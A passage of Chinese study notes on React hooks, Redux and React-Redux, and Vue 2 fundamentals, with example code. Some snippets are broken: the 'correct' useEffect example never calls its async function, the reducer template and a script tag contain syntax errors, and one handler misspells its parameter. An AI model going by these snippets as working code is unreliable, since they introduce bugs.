      <button onClick={() => setCount(count + 1)}>{count}</button>
    </div>
  )
}

function App() {
  return (
    <>
      <Counter count={10} />
      <Counter count={20} />
    </>
  )
}

export default App
```

#### 11.2 useEffect - 发送网络请求

**使用场景**

如何在useEffect中发送网络请求，并且封装同步 async await操作



**语法要求**

不可以直接在useEffect的回调函数外层直接包裹 await ，因为**异步会导致清理函数无法立即返回**

```javascript
useEffect(async ()=>{    
    const res = await axios.get('http://geek.itheima.net/v1_0/channels')   
    console.log(res)
},[])
```

**正确写法**

在内部单独定义一个函数，然后把这个函数包装成同步

```jsx
useEffect(()=>{   
    async function fetchData(){      
       const res = await axios.get('http://geek.itheima.net/v1_0/channels')                            console.log(res)   
    } 
},[])
```

#### 11.3 useRef

**使用场景**

在函数组件中获取真实的dom元素对象或者是组件对象



**使用步骤**

1. 导入 `useRef` 函数
2. 执行 `useRef` 函数并传入null，返回值为一个对象 内部有一个current属性存放拿到的dom对象（组件实例）
3. 通过ref 绑定 要获取的元素或者组件

**获取dom**

```jsx
import { useEffect, useRef } from 'react'
function App() {  
    const h1Ref = useRef(null)  
    useEffect(() => {    
        console.log(h1Ref)  
    },[])  
    return (    
        <div>      
            <h1 ref={ h1Ref }>this is h1</h1>    
        </div>  
    )
}
export default App
```



**获取组件实例**

函数组件由于没有实例，不能使用ref获取，如果想获取组件实例，必须是类组件

```jsx
class Foo extends React.Component {  
    sayHi = () => {    
        console.log('say hi')  
    }  
    render(){    
        return <div>Foo</div>  
    }
}
    
export default Foo
```



```jsx
import { useEffect, useRef } from 'react'
import Foo from './Foo'
function App() {  
    const h1Foo = useRef(null)  
    useEffect(() => {    
        console.log(h1Foo)  
    }, [])  
    return (    
        <div> <Foo ref={ h1Foo } /></div>  
    )
}
export default App
```

#### 11.4 useContext

**实现步骤**

1. 使用`createContext` 创建Context对象
2. 在顶层组件通过`Provider` 提供数据
3. 在底层组件通过`useContext`函数获取数据

```jsx
import { createContext, useContext } from 'react'
// 创建Context对象
const Context = createContext()

function Foo() {  
    return <div>Foo <Bar/></div>
}

function Bar() {  
    // 底层组件通过useContext函数获取数据  
    const name = useContext(Context)  
    return <div>Bar {name}</div>
}

function App() {  
    return (    
        // 顶层组件通过Provider 提供数据    
        <Context.Provider value={'this is name'}>     
            <div><Foo/></div>    
        </Context.Provider>  
    )
}

export default App
```

## 四、React-Redux

### 1、redux基本认识

#### 1.1 为什么使用

首先说它为什么出现

1.趋势所致： JavaScript 单页应用开发日趋复杂，**JavaScript 需要管理比任何时候都要多的 state （状态）。**

2.管理不断变化的 state 非常困难：如果一个 model 的变化会引起另一个 model 变化，那么当 view 变化时，就可能引起对应 model 以及另一个 model 的变化，依次地，可能会引起另一个 view 的变化。**state 在什么时候，由于什么原因，如何变化已然不受控制。**

#### 1.2 redux 介绍

redux 是一个专门用于做状态管理的JS库(不是react插件库)。它可以用在 react, angular, vue 等项目中, 但基本与 react 配合使用。
作用: 说到底它也只是个工具，了解一个工具最开始当然是要了解它是做啥的咯。

官网对它的定义：Redux 是 JavaScript 状态容器，提供可预测化的状态管理。

详细一些：

- Redux会将整个应用状态(其实也就是数据)存储到`Store`
- Store里面保存一棵状态树(`state tree`)
- 组件改变state的唯一方法是通过调用store的`dispatch`方法，触发一个`action`，这个action被对应的`reducer`处理，于是state完成更新
- 组件可以派发(dispatch)行为(action)给store,而不是直接通知其它组件
- 其它组件可以通过订阅store中的状态(state)来刷新自己的视图

#### 1.3 redux原理图

Redux原理图

![img](./img/小米虫爬山路-img/642843196bf84d68a4295d4a464f4c1b.png)

==注意：一定要熟悉此图，搞懂所有的流程，接下来的所有内容都是按照此图为基础的，建议看==[b站的尚硅谷React教程](https://www.bilibili.com/video/BV1wy4y1D7JT?p=97&vd_source=6f12eac1da397b0efdd20e02514a56f9)97-102集

### 2、redux核心概念

==注意：在react中最好使用一个文件夹把与redux相关的文件都放在一起，一般使用的结构如下：==

```Plain Text
src
    - redux
          - store.js
          - reducers
              - 项目名_reducer.js
          - actions
              - 项目名_action.js
    - App.js
```

#### 2.1 Store

- 用来维持应用所有的 state 树 的一个对象，改变 store 内 state 的惟一途径是对它 dispatch 一个 action。
- Store 不是类，它只是有几个方法的对象。 要创建它，==只需要把对应组件的 reducer 函数传递给在redux封装好的函数 createStore。==

```jsx
//原版的createStore已经被弃用，只能使用这种方法来导入
import { legacy_createStore as createStore } from 'redux'
//从reducer文件中引入相应的项目名_reducer.js文件
import { reducer } from '../reducer'

//通过封装好的api来创建store
const store = createStore(reducer)

export default store
```

##### creteStore的使用

```jsx
createStore（reducer, [preloadedState], [enhancer]）
```

参数:

1. `reducer` *(Function)*: 接收两个参数，分别是旧的 state 值和要处理的 [action](https://cn.redux.js.org/understanding/thinking-in-redux/glossary#action)，返回新的 [state 值](https://cn.redux.js.org/understanding/thinking-in-redux/glossary#state)。

2. [`preloadedState`] *(any)*: 可选，当你的store用于管理多个组件的state时，可以使用`combineReducers`创建一个`allReducers`，它必须是一个普通对象，与传入的 keys 保持同样的结构。如下：

   ```jsx
   const allReducers = combineReducers({
       组件名1：组件1的reducers
       组件名2：组件2的reducers
   })
   ```

3. `enhancer` *(Function)*: Store enhancer。你可以选择指定它以使用第三方功能，如middleware、时间旅行、持久化或异步时来增强 store。Redux 中唯一内置的 store enhander 是 [`applyMiddleware()`](https://cn.redux.js.org/api/applymiddleware)。

返回值

([*`Store`*](https://cn.redux.js.org/api/store)): 保存了应用程序所有 state 的对象。改变 state 的惟一方法是 [dispatch action](https://cn.redux.js.org/api/store#dispatchaction)。你也可以 [subscribe](https://cn.redux.js.org/api/store#subscribelistener) state 的变化，然后更新 UI。

#### 2.2 Reducers

- 指定了应用状态的变化如何响应 actions 并发送到 store 。
- Reduce r函数会接收到两个参数，分别为：之前的状态、动作对象。
- Reducer 有两个作用：初始化状态、加工状态。
- Reducer 的第一次调用时，是store自动触发的，传递的 preState(之前的状态) 是undefined

==你可以把reducers理解为修改对应组件状态的方法，修改的同时也会初始化组件对应的状态== ，一般在 项目名_reducer.js 的结构如下

```jsx
//在reducer.js文件中
const initState =  初始值

export default function 项目名Reducer(preState = initState,action){
    switch (action.type) {
        case '类型1':
            return {
                preState + action.data
            }
        case ''类型2':
            return {
                preState + action.data
            }
        default:
            return preState
    }
}
```

Reducer应该是个纯函数，即只要传入相同的参数，每次都应返回相同的结果。不要把和处理数据无关的代码放在Reducer里，让Reducer保持纯净，只是单纯地执行计算。

有两个注意点：一是首次执行Redux时，你需要给state一个初始值。二是根据官网的说明，Reducer每次更新状态时需要一个新的state，==因此不要直接修改旧的state参数，而是应该先将旧state参数复制一份，在副本上修改值，返回这个副本==。

#### 2.3 Action

- 可以省略创建。
- 把数据从应用传到 store 的有效载荷，Action 是 store 数据的唯一来源。
- 一般来说会通过 store.dispatch() 将 action 传到 store。
- 有两个属性
- `type` ：标识属性, 值为字符串, 唯一, 必要属性。
- `data` ：数据属性, 值类型任意, 可选属性

action一般是一个对象，但是在某些时候action也是一个函数这里不过多的展开。一般在文件中的 项目名_action.js 的结构如下

```jsx
export function 类型1Action(newData){
    return {type:'类型1'，data:newData}
}
export function 类型2Action(newData){
    return {type:'类型2'，data:newData}
}
//这样就可以在外部使用action方法来返回一个固定的action对象了，记得调用时要传入新的值
```

#### 2.4 重要API subscribe

在你对store的state进行操作后，在页面上不会显示出来，这是因为你没有添加监听者用于监听state的改变来重新渲染。在redux中提供了一个方法用于监听并执行操作`store.subscribe(() => { })`，此方法就是在store的状态一旦改变就会执行括号中传入的函数

`store.subscribe(() => { })`有两种渲染方式

方法一、

在组件的 **componentDidMount** 生命周期钩子中调用 `store.subscribe`

```jsx
componentDidMount() {
    // 监听redux中状态的变化，只要变化，就调用render
    store.subscribe(() => {
    	//状态假更新，每次状态更新都会调用render
        this.setState({});//这是react的一个不好的地方就是不管改没改都会去重新渲染组件，一般在类组件中使用，后续我们将使用函数组件可以不用关心这个问题。
    });
}

```

方法二、

在 **index.js** 文件中检测 store 中状态的改变，一旦发生改变重新渲染`<App/>`

```jsx
import React from "react";
import reactDOM from "react-dom";
import App from "./App";
import store from "./redux/store";
reactDOM.render(<App />, document.getElementById("root"));
// store中状态改变，重新渲染dom
store.subscribe(() => {
  reactDOM.render(<App />, document.getElementById("root"));
});

```



### 3、react-redux 基本认识

[官方文档](https://cn.react-redux.js.org/introduction/getting-started)

#### 3.1 react-redux 的优势

1、Redux是其他团队给出的集中式管理组件状态的库，而React-Redux是由React团队根据Redux研发的库，所以跟符合更能与React对接

2、使用React-Redux比单纯的使用Redux跟高效，不用把redux里的任何文件引入组件UI中，这样让数据与视图分开，更符合我们的初衷。

3、在单纯的Redux中我们改变store中的状态后，要使用`store.subscribe(() => { })`来重新渲染，但是在 React-Redux 中不需要我们手动调用，它自己会帮我们渲染，就像官网所说可以提高性能

#### 3.2 react-redux 原理图

React-Redux原理图

![image-20230719193840065](./img/小米虫爬山路-img/image-20230719193840065.png)

==和redux一样这里也会要完全理解熟悉建议观看==[b站的尚硅谷React教程](https://www.bilibili.com/video/BV1wy4y1D7JT?p=97&vd_source=6f12eac1da397b0efdd20e02514a56f9)103-111集

### 4、react-redux的基本使用

和单纯使用redux不一样，使用react-redux就简便的多

#### 4.1 为 React 提供 Redux Store

==注意：做这一步的前提是你已经把redux文件全部写好了==

我们可以通过在 `src/index.js` 中的应用程序外层放置一个 React Redux `<Provider>` 来使其对我们的 React 组件可用。导入我们刚刚创建的 Redux store，在 `<App>` 的外层放置一个 `<Provider>`，==并将 store 作为 prop 传递==：

```jsx
import React from 'react';
import ReactDOM from 'react-dom/client';
import './index.css';
import App from './App';
import store from './app/store';
import { Provider } from 'react-redux';

// 从 React 18 开始
const root = ReactDOM.createRoot(document.getElementById('root'));

root.render(
  <Provider store={store}>
    <App />
  </Provider>
);
```

#### 4.2 把组件和状态(state)连接起来

通过前面的原理图可以知道，react-redux把组件分成里 容器组件和UI组件。容器组件用于向UI组件传入==redux中保存的状态==和==操作状态的方法==这里的容器组件不是我们手写而是通过`connect`这个函数创造的，具体如下：

```jsx
const 组件名Container = connect(mapStateToProps，mapDispatchToProps)(组件名UI)
```

##### mapStateToProps

此参数用作将state映射到props上去，组件即可通过调用props中的值来获取state

```jsx
function mapStateToProps(state, ownProps?)

function mapStateToProps(state) {
    return {
        count: state.count
    }
}

```

`mapStateToProps` 函数的第一个参数是整个 Redux store state（与调用 `store.getState()` 返回的值相同）。正因为如此，第一个参数习惯上只是称作 `state`。

==注意：这里传入的函数`mapStateToProps`，是在react-redux中帮你调用了，所以你不用管传入了什么实参，这个参数state也是react-redux帮你传入的,传入的就是redux中保存的状态state==

##### mapDispatchToProps

此参数将把dispatch函数映射到props中去，组件中即可调用此方法进行分派行为(action)

```jsx
function mapDispatchToProps(dispatch) {
    return {
        事件类型1: (newData) => {dispatch(类型1Action(newData)) },
        事件类型2: (newData) => { dispatch(类型2Action(newData))}
    }
}
```

`mapDispatchToProps` 函数将使用 `dispatch` 作为第一个参数被调用。

==注意：这里react-redux帮我们调用，react-redux给的实参是`store.dispatch`函数。==



==剩余的就只在UI组件中直接使用props来得到状态和操作状态的方法。这样就完成了组件状态的集中管理==

####  4.3 React-Redux的hook使用

因为hook函数的简单，所以我们一般使用hook来管理状态。

和 `connect()` 一样，你应该先用 `<Provider>` 组件来包裹你的整个应用程序，以使 store 在整个组件树中可用。

```jsx
import React from 'react';
import ReactDOM from 'react-dom/client';
import './index.css';
import App from './App';
import store from './app/store';
import { Provider } from 'react-redux';

// 从 React 18 开始
const root = ReactDOM.createRoot(document.getElementById('root'));

root.render(
  <Provider store={store}>
    <App />
  </Provider>
);
```

##### `useSelector()`

允许你使用一个 selector 函数从 Redux store state 中提取数据。

```jsx
const result: any = useSelector(selector: Function, equalityFn?: Function)
```

selector 在概念上大约等同于 `mapStateToProps`,就是在UI中直接得到状态

==注意：当 dispatch 一个 action 时，`useSelector()` 将对 selector 的前一个结果值和当前的结果值做一个引用比较。如果它们不同，该组件将被强制重新渲染。如果它们相同，组件将不会重新渲染。==

```jsx
const count = useSelector(state => state.count)
//上述代码就是获取了state保存的count，这样组件就可使用了。
```

##### `useDispatch()`

```jsx
const dispatch = useDispatch()
```

这个 hook 返回一个对 Redux store 中的 `dispatch` 函数的引用。你可以按需使用它来 dispatch action。

```jsx
const dispatch = useDispatch();

    const 事件类型1 = (newData) => {
        dispatch(类型1Action(newData))
    }
    const  事件类型2 = (newData) => {
       dispatch(类型2Action(newData))
    }
```

##### `useStore()`

```jsx
const store = useStore()
```

这个 hook 返回一个 Redux store 引用，该 store 与传递给 `<Provider>` 组件的 store 相同。

## 五、Vue

### 1、Vue基础

#### 1.1 什么是Vue

Vue `(读音 /vjuː/，类似于 **view**)` 是一套用于构建用户界面的**渐进式框架**。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与[现代化的工具链](https://v2.cn.vuejs.org/v2/guide/single-file-components.html)以及各种[支持类库](https://github.com/vuejs/awesome-vue#libraries--plugins)结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。

#### 1.2 Vue特点

1. 采用组件化模式，提高代码复用率、且让代码更好维护。
2. ==声明式==编码，让编码人员无需直接操作DOM，提高开发效率。
3. 使用虚拟DOM+优秀的Diff算法，尽量复用DOM节点。

#### 1.3 Vue引入方式

方式一、使用script引入

官网下载开发版Vue.js使用script

```vue
<script scr='本地Vue文件'></script>
```

### 2、Vue基本使用

#### 2.1 初识Vue：

1. 想让Vue工作，就必须创建一个Vue实例,且要传入一个配置对象;
2. root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法如`{{js表达式}}`;
3. root容器里的代码被称为【Vue模板】;
4. vue实例和容器是一一对应的;
5. 真实开发中只有一个vue实例,并且会配合着组件一起使用;
6. {{xxx]}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性;
7. 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新;

#### 2.2 模板语法

##### 2.2.1 插值语法

- 功能：用于==解析标签体内容==
- 写法：`{{xxx}}`，xxx是js表达式，且可以直接读取到data中的所有区域

##### 2.2.2 指令语法(更强大)

- 功能：用于==解析标签（包括：标签属性、标签体内容、绑定事件…）==

- 举例：<a v-bind:href="xxx">或简写为<a :href="xxx">，xxx同样要写js表达式且可以直接读取到data中的所有属性

- 备注：Vue中有很多的指令，==且形式都是v-???，此处我们只是拿v-bind举个例子==

  ```html
   <div id="root">
          <h1>插值语法</h1>
          <h3>你好，{{name}}!</h3>
          <hr>
          <h1>指令语法</h1>
          <a v-bind:href="url">快去看新番！</a><br>
          <a :href="url">快去看新番！</a>
      </div>
  
      <script>
          Vue.config.productionTip = false 
          new Vue({
              el:'#root', 
              data:{ 
                  name:'Test',
                  url:'https://www.bilibili.com/'
              }
          })
      </script>
  ```


#### 2.3 数据绑定

##### 两种绑定方式

1. 单向绑定（`v-bind`）：数据只能从data流向页面
2. 双向绑定（`v-model`）：数据不仅能从data流向页面，还可以从页面流向data

注意：

1. 双向绑定一般都应用在表单类元素上（如：`<input>`、`<select>`、`<textarea>`等）
2. `v-model:value`可以简写为`v-model`，因为`v-model`==默认收集的就是value值==

```html
<body>
    <div id="root">
        单向数据绑定：<input type="text" v-bind:value="name"><br>
        双向数据绑定：<input type="text" v-model:value="name">
    </div>

    <script>
        Vue.config.productionTip = false 
        new Vue({
            el:'#root', 
            data:{
                name:'Test'
            }
        })
    </script>
    </body>
```

#### 2.4 el与data的两种写法

##### el有2种写法

1. 创建Vue实例对象的时候配置el属性
2. 先创建Vue实例，随后再通过`vm.$mount('#root')`指定el的值

##### data有2种写法

1. 对象式
2. 函数式

如何选择：目前哪种写法都可以，以后学到组件时，data必须使用函数，否则会报错

注意：由Vue管理的函数，一定不要写箭头函数，否则this就不再是Vue实例了

```html
<body>
    <div id="root">
        <h1>Hello,{{name}}!</h1>
    </div>

    <script>
        Vue.config.productionTip = false 
        //el的两种写法：
        // const vm = new Vue({
        //     // el:'#root', //第一种写法
        //     data:{
        //         name:'JOJO'
        //     }
        // })
        // vm.$mount('#root')//第二种写法

        //data的两种写法：
        new Vue({
            el:'#root', 
            //data的第一种写法：对象式
            // data:{
            //     name:'JOJO'
            // }
            //data的第二种写法：函数式
            data(){
                return{
                    name:'JOJO'
                }
            }
        })
    </script>
</body>
```

#### 2.5 MVVM模型

原理图：

![image-20230723103740373](./img/小米虫爬山路-img/image-20230723103740373.png)

MVVM模型：

- M：模型（Model），data中的数据
- V：视图（View），模板代码
- VM：视图模型（ViewModel），Vue实例

```html
<body>
    <div id="root">
        <h2>名称：{{name}}</h2>
        <h2>战队：{{rank}}</h2>
        <h2>测试：{{$options}}</h2>
    </div>

    <script>
        Vue.config.productionTip = false
        new Vue({
            el:'#root',
            data:{ 
                name:'uzi',
                rank:'RNG'
            }
        })
    </script>
</body>
```

 **总结：**

- data中所有的属性，最后都出现在了vm身上
- vm身上所有的属性 及 Vue原型身上所有的属性，在Vue模板中都可以直接使用



### 3、Vue数据代理

![image-20230723105313536](./img/小米虫爬山路-img/image-20230723105313536.png)

```javascript
//作用向对象传入添加新的属性
object.defineProperty(指定的对象，属性名，配置对象{
                      value: 值,
                      enumerable:true,//控制属性是否可以枚举，默认值是
                      falsewritable:true,//控制属性是否可以被修改，默认值是
                      falseconfigurable:true //控制属性是否可以被期除,默认值是false
                      get(){
    return : xxx
}
set(value){
    xxx = value
}
})
```

定义：

Vue中的数据代理通过vm对象来代理data对象中属性的操作（读/写）

Vue中数据代理的好处：更加方便的操作data中的数据

基本原理：

- 通过object.defineProperty()把data对象中所有属性添加到vm上。
- 为每一个添加到vm上的属性，都指定一个getter/setter。
- 在getter/setter内部去操作（读/写）data中对应的属性。

### 4、事件处理

##### 4.1 事件的基本用法

1. 使用v-on:xxx或@xxx绑定事件，其中xxx是事件名
2. 事件的回调需要配置在methods对象中，最终会在vm上
3. methods中配置的函数，==不要用箭头函数！==否则this就不是vm了
4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象
5. @click="demo和@click="demo($event)"效果一致，但==后者可以传参==

```html
<body>
    <div id="root">
        <h2>hello,{{name}}</h2>
        <button v-on:click="showInfo1">点我提示信息1</button>
        <button @click="showInfo2($event,66)">点我提示信息2</button>
    </div>

    <script>
        Vue.config.productionTip = false 
        new Vue({
            el:'#root', 
            data:{
                name:'JOJO'
            },
            methods:{
                showInfo1(event){
                    console.log(event)
                },
                showInfo2(evnet,num){
                    console.log(event,num)
                }
            }
        })
    </script>
</body>
```

##### 4.2 事件修饰符

Vue中的事件修饰符：

- prevent：阻止默认事件（常用）
- stop：阻止事件冒泡（常用）
- once：事件只触发一次（常用）
- capture：使用事件的捕获模式
- self：只有`event.target`是当前操作的元素时才触发事件
- passive：事件的默认行为立即执行，无需等待事件回调执行完毕

==注意：修饰符可以连续写，比如可以这么用：`@click.prevent.stop="showInfo"`==

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件 -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

			<!-- 阻止事件冒泡 -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
			</div>

			<!-- 事件只触发一次 -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件 -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 -->
			<ul @wheel.passive="demo" class="list">
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods:{
				showInfo(e){
					alert('同学你好！')
				},
				showMsg(msg){
					console.log(msg)
				},
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```

##### 4.3 键盘事件

键盘上的每个按键都有自己的名称和编码，例如：Enter（13）。而Vue还对一些常用按键起了别名方便使用

Vue中常用的按键别名：

- 回车：enter

- 删除：delete (捕获“删除”和“退格”键)
- 退出：esc
- 空格：space
- 换行：tab (特殊，必须配合keydown去使用)
- 上：up
- 下：down
- 左：left
- 右：right

注意：

1. 系统修饰键（用法特殊）：ctrl、alt、shift、meta


- 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发

- 配合keydown使用：正常触发事件

2. 可以使用keyCode去指定具体的按键，比如：@keydown.13="showInfo"，但不推荐这样使用

3. `Vue.config.keyCodes.自定义键名 = 键码`，可以自定义按键别名
4. 再判断键的时候可以判断多个键如`@keyup.ctrl.y = '执行的回调函数'`，这样只能按下ctrl和y是才能触发

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```

### 5、计算属性

计算属性：

- 定义：要用的属性不存在，需要通过已有属性计算得来。

- 原理：底层借助了Objcet.defineproperty()方法提供的getter和setter。

- get函数什么时候执行？

  1. 初次读取时会执行一次
  2. 当依赖的数据发生改变时会被再次调用,只要里面有一个数据发生变化就会重新调用

- 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便

备注：

- 计算属性最终会出现在vm上，直接读取使用即可

- ==如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变==

- 如果计算属性确定不考虑修改，可以使用计算属性的==简写形式==

```js
  new Vue({
      el:'#root', 
      data:{ 
          firstName:'张',
          lastName:'三'
      },
      computed:{
      	fullName(){
  		    return this.firstName + '-' + this.lastName
      	}
      }
  })
  
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>计算属性</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        姓：<input type="text" v-model="firstName"><br><br>
        名：<input type="text" v-model="lastName"><br><br>
        姓名：<span>{{fullName}}</span>
    </div>

    <script>
        Vue.config.productionTip = false 

        new Vue({
            el:'#root', 
            data:{ 
                firstName:'张',
                lastName:'三'
            },
            computed:{
                fullName:{
                    get(){
                        return this.firstName + '-' + this.lastName
                    },
                    set(value){
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
                    }
                }
            }
        })
    </script>
</body>
</html>
```



### 6、监视属性

#### 6.1 监视属性基本用法

监视属性watch：

1. 当被监视的属性变化时，回调函数*handler()*自动调用，进行相关操作
2. 监视的属性必须存在，才能进行监视
3. 监视有两种写法：
   1. 创建Vue时传入watch配置
   2. 通过`vm.$watch`监视

```js
vm.$watch('isHot',{
	immediate:true,
	handler(newValue,oldValue){
		console.log('isHot被修改了',newValue,oldValue)
	}
})
```

#### 6.2 深度监视

深度监视：

1. Vue中的watch默认不监测对象内部值的改变（一层）
2. 在watch中配置deep:true可以监测对象内部值的改变（多层）

备注：

1. Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以
2. 使用watch时根据监视数据的具体结构，决定是否采用深度监视

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>深度监视</title>
        <script src="../js/vue.js"></script>
    </head>
    <body>
        <div id="root">
            <h3>a的值是:{{numbers.a}}</h3>
            <button @click="numbers.a++">点我让a+1</button>
            <h3>b的值是:{{numbers.b}}</h3>
            <button @click="numbers.b++">点我让b+1</button>
        </div>

        <script>
            Vue.config.productionTip = false 

            new Vue({
                el:'#root', 
                data:{ 
                    isHot:true,
                    numbers:{
                        a:1,
                        b:1,
                    }
                },
                watch:{
                    //监视多级结构中所有属性的变化
                    numbers:{
                        deep:true,
                        handler(){
                            console.log('numbers改变了')
                        }
                    }
                    //监视多级结构中某个属性的变化
                    /* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
                }
            })
        </script>
    </body>
</html>

```

#### 6.3 监视属性简写

如果监视属性除了handler没有其他配置项的话，可以进行简写。

```html
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            isHot:true,
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        },
        watch:{
            //正常写法
            isHot:{
                handler(newValue,oldValue){
                    console.log('isHot被修改了',newValue,oldValue)
                }
            }, 
            //简写
            isHot(newValue,oldValue){
                console.log('isHot被修改了',newValue,oldValue,this)
            }
        }
    })

    //正常写法
    vm.$watch('isHot',{
        handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    })
    //简写
    vm.$watch('isHot',function(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue,this)
    })
</script>

```

#### 6.4 监视属性和计算属性

- computed和watch之间的区别：
  - computed能完成的功能，watch都可以完成
  - watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作

- 两个重要的小原则：
  1. 所有被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象
  2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成==箭头函数==，这样this的指向才是vm 或 组件实例对象。

### 7、绑定样式

1. class样式：


- 写法：`class="xxx"`，xxx可以是字符串、对象、数组

- 字符串写法适用于：类名不确定，要动态获取

- 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定

- 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用




2. style样式：

- :style="{fontSize: xxx}"其中xxx是动态值
- :style="[a,b]"其中a、b是样式对象

```css
<style>
    .basic{
        width: 400px;
        height: 100px;
        border: 1px solid black;
    }
    .happy{
        border: 4px solid red;;
        background-color: rgba(255, 255, 0, 0.644);
        background: linear-gradient(30deg,yellow,pink,orange,yellow);
    }
    .sad{
        border: 4px dashed rgb(2, 197, 2);
        background-color: gray;
    }
    .normal{
        background-color: skyblue;
    }

    .atguigu1{
        background-color: yellowgreen;
    }
    .atguigu2{
        font-size: 30px;
        text-shadow:2px 2px 10px red;
    }
    .atguigu3{
        border-radius: 20px;
    }
</style>

```

```html
<div id="root">
    <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
    <div class="basic" :class="classArr">{{name}}</div> <br/><br/>

    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
    <div class="basic" :class="classObj">{{name}}</div> <br/><br/>

    <!-- 绑定style样式--对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>

    <!-- 绑定style样式--数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>
</div>

```

```javascript
<script type="text/javascript">
    Vue.config.productionTip = false

const vm = new Vue({
    el:'#root',
    data:{
        name:'尚硅谷',
        mood:'normal',
        classArr:['atguigu1','atguigu2','atguigu3'],
        classObj:{
            atguigu1:false,
            atguigu2:false,
        },
        styleObj:{
            fontSize: '40px',
            color:'red',
        },
        styleObj2:{
            backgroundColor:'orange'
        },
        styleArr:[
            {
                fontSize: '40px',
                color:'blue',
            },
            {
                backgroundColor:'gray'
            }
        ]
    },
    methods: {
        changeMood(){
            const arr = ['happy','sad','normal']
            const index = Math.floor(Math.random()*3)
            this.mood = arr[index]
        }
    },
})
</script>

```

### 8、条件渲染

1. v-if：

   写法：

   1. `v-if="表达式"`
   2. `v-else-if="表达式"`
   3. `v-else`

   - 适用于：切换频率较低的场景
   - 特点：==不展示的DOM元素直接被移除==
   - 注意：`v-if`可以和`v-else-if`、`v-else`一起使用，但要求结构不能被打断

2. v-show：

- 写法：`v-show="表达式"`
- 适用于：切换频率较高的场景
- 特点：==不展示的DOM元素未被移除，仅仅是使用样式隐藏掉==

注意：使用`v-if`的时，元素可能无法获取到，而使用`v-show`一定可以获取到

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>条件渲染</title>
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>
    <body>
        <div id="root">
            <h2>当前的n值是:{{n}}</h2>
            <button @click="n++">点我n+1</button>

            <h2 v-show="true">Hello,{{name}}!</h2>

            <div v-if="n === 1">Angular</div>
            <div v-else-if="n === 2">React</div>
            <div v-else>Vue</div>
